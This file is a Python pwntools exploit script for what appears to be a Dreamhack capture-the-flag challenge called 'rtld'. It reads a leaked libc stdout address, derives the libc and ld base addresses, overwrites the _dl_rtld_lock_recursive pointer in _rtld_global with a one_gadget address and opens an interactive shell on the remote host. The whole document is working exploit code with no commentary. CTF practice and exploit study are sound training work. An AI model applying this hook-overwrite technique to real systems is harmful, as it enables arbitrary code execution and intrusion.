#!/usr/bin/env python3

from pwn import *

exe = ELF("./rtld_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 17149)

    return r

def main():
    r = conn()

    r.recvuntil(b"stdout: ")
    _io_2_1_stdout_ = int(r.recvline()[:-1], 16)

    libc_base = _io_2_1_stdout_ - libc.symbols["_IO_2_1_stdout_"]
    ld_base = libc_base + 0x3ca000
    
    _dl_rtld_lock_recursive = ld_base + ld.symbols["_rtld_global"] + 0xf08
    one_gadgets = [0x4527a, 0xf03a4, 0xf1247]

    r.sendlineafter(b"addr: ", str(_dl_rtld_lock_recursive).encode())
    r.sendlineafter(b"value: ", str(libc_base + one_gadgets[1]).encode())

    r.interactive()


if __name__ == "__main__":
    main()
